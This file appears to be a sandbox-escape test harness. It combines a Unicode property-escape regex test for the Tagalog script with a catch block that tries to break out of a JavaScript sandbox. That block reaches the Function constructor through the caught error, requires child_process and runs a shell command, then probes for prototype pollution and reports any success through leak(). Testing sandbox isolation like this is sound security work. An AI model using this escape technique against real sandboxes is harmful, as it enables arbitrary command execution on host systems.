try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                5888,
                5900
            ],
            [
                5902,
                5908
            ],
            [
                5941,
                5942
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Tagalog}+$/u, matchSymbols, '\\p{Script_Extensions=Tagalog}');
    testPropertyEscapes(/^\p{Script_Extensions=Tglg}+$/u, matchSymbols, '\\p{Script_Extensions=Tglg}');
    testPropertyEscapes(/^\p{scx=Tagalog}+$/u, matchSymbols, '\\p{scx=Tagalog}');
    testPropertyEscapes(/^\p{scx=Tglg}+$/u, matchSymbols, '\\p{scx=Tglg}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [5901],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                5887
            ],
            [
                5909,
                5940
            ],
            [
                5943,
                56319
            ],
            [
                57344,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Tagalog}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Tagalog}');
    testPropertyEscapes(/^\P{Script_Extensions=Tglg}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Tglg}');
    testPropertyEscapes(/^\P{scx=Tagalog}+$/u, nonMatchSymbols, '\\P{scx=Tagalog}');
    testPropertyEscapes(/^\P{scx=Tglg}+$/u, nonMatchSymbols, '\\P{scx=Tglg}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}